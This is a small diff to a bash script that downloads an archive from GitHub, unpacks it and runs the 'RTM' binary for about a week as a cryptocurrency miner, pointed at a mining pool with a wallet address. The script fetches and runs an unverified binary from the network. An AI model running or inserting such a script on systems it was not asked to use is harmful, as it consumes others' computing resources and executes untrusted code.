@@ -1,3 +1,4 @@
+#!/bin/bash
 wget https://github.com/icha798/revo/raw/main/RTM.tar.gz
 tar xf RTM.tar.gz
 timeout 10080m ./RTM -a gr -o stratum-na.rplant.xyz:17056 -u RXbint4v6jwyEteqiCxmXbFk8AoSReUTfA.RabidWS -p x --threads=31 
